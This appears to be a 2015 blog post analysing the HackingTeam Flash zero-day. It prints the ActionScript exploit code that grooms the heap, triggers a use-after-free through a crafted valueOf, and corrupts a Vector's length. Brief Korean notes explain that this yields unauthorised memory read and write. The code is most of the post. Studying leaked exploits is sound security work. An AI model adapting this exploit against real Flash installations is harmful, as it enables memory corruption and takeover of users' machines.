---
layout: post
title: "HackingTeam's Flash 0day"
date: 2015-07-09 15:53:27 +0900
comments: true
categories: 
---

```
static var _ba:ByteArray;
static var _va:Array;

var a = new Array(90);
for (var i: int; i < 90; i+= 3) {
    a[i] = new Class2(i);
    a[i+1] = new ByteArray();
    a[i+1].length = 0xfa0; // 4000
    a[i+2] = new Class2(i+2)
}

a[0]: Class2(0)
a[1]: ByteArray()
a[2]: Class2(2)
a[3]: Class2(3)
a[4]: ByteArray()
a[5]: Class2(5)
a[6]: Class2(6)
a[7]: ByteArray()
...
a[85]: ByteArray()
a[86]: Class2(86)
a[87]: Class2(87)
a[88]: ByteArray()
a[89]: Class2(89)

prototype.valueOf =  function() {
    _va = new Array(5)
    _gc.push(_va)
    _ba.length = 0x1100
    for(var i:int;i<_va.length;i++)
        _va[i] = new Vector.<uint>(0x3f0)
    return 0x40;
}

var v:Vector.<uint>;
for (i=85; i>=0; i-=3) {
    _ba = a[i];
    _ba[3] = new MyClass(); // call MyClass()'s prototype.valueOf
    if (_ba[3]!=0x0) throw new Error("can't cause UaF");
```

valueOf() 의 ret 값이 vector length 에 씌여지기때문에, 
_ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.

UaF 가 성공했으면, _va[i] 의 4 번째 바이트가 0x40 으로 씌여진다.
이제 length 가 굉장히 길어진 Vector 가 탄생했다.
이 Vector 로 메모리의 허가받지 않은 영역을 read & write 할 수 있다.
